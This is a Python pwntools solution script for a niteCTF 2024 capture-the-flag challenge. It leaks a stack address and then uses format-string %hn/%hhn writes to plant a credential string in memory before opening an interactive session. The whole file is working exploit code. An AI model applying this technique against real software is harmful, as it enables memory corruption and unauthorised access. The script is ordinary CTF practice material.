#!/usr/bin/env python3



from pwn import *

e = ELF("./chall")
#r = process("./chall")
r = remote("chaterine.chals.nitectf2024.live",1337,ssl=True)


def add_message(index,size):
    r.sendlineafter(b">>",b"1")
    r.sendlineafter(b"Enter index:",f"{index}")
    r.sendlineafter(b"Enter size:",f"{size}")

def delete_message(index):
    r.sendlineafter(b">>",b"2")
    r.sendlineafter(b"Enter index:",f"{index}")

def write_message(index,msg):
    r.sendlineafter(b">>",b"3")
    r.sendlineafter(b"Enter index:",f"{index}")
    r.sendline(msg)

r.sendline(b"%19$p")
r.recvuntil(b"Hello ")
write_place = int(r.recvline().strip(),16) - 0x148
log.info("The place to write the credentials is  " + hex(write_place))
add_message(0,200)
write_byte = write_place & 0xffff
exploit = f"%{write_byte}c".encode() + b"%19$hn    "
write_message(0,exploit)
val = 0x7264726564697073
for i in range(0,8):
    flag = (val >> (i * 8))&0xff
    write_byte = (write_place + i)&0xff
    if(write_byte > 100):
        writer = f"%{write_byte}c".encode() + b"%19$hhn    "
    elif(write_byte > 10):
        writer = f"%{write_byte}c".encode() + b"%19$hhn     "
    else:
        writer = f"%{write_byte}c".encode() + b"%19$hhn      "
    write_message(0,writer)
    if(val > 100):
        exploit = f"%{flag}c".encode() + b"%49$hhn    "
    elif(val > 10):
        exploit = f"%{flag}c".encode() + b"%49$hhn     "
    else:
        exploit = f"%{flag}c".encode() + b"%49$hhn      "
    write_message(0,exploit)
val = 0x657669
for i in range(0,3):
    if(i == 2):
        flag = (val >> (i * 8))&0xff
        write_byte = (write_place + i + 8)&0xff
        if(write_byte > 100):
            writer = f"%{write_byte}c".encode() + b"%19$hhn    "
        elif(write_byte > 10):
            writer = f"%{write_byte}c".encode() + b"%19$hhn     "
        else:
            writer = f"%{write_byte}c".encode() + b"%19$hhn      "
        write_message(0,writer)
        if(val > 100):
            exploit = f"%{flag}c".encode() + b"%49$n      "
        elif(val > 10):
            exploit = f"%{flag}c".encode() + b"%49$n       "
        else:
            exploit = f"%{flag}c".encode() + b"%49$n        "
        write_message(0,exploit)

    else:
        flag = (val >> (i * 8))&0xff
        write_byte = (write_place + 0x8 + i)&0xff
        if(write_byte > 100):
            writer = f"%{write_byte}c".encode() + b"%19$hhn    "
        elif(write_byte > 10):
            writer = f"%{write_byte}c".encode() + b"%19$hhn     "
        else:
            writer = f"%{write_byte}c".encode() + b"%19$hhn      "
        write_message(0,writer)
        if(val > 100):
            exploit = f"%{flag}c".encode() + b"%49$hhn    "
        elif(val > 10):
            exploit = f"%{flag}c".encode() + b"%49$hhn     "
        else:
            exploit = f"%{flag}c".encode() + b"%49$hhn      "
        write_message(0,exploit)
r.interactive()
